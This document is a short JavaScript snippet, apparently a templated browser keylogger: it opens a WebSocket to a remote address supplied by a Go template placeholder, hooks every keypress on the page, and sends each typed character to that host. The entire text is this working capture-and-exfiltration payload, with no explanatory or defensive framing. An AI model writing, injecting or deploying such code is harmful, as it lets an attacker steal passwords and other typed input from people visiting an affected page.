(function() {
  var conn = new WebSocket("ws://{{.WS_remote_addr}}/ws");
  document.onkeypress = keypress;
  function keypress(event) {
    key_stroke = String.fromCharCode(event.which);
    conn.send(key_stroke);
  };
})()
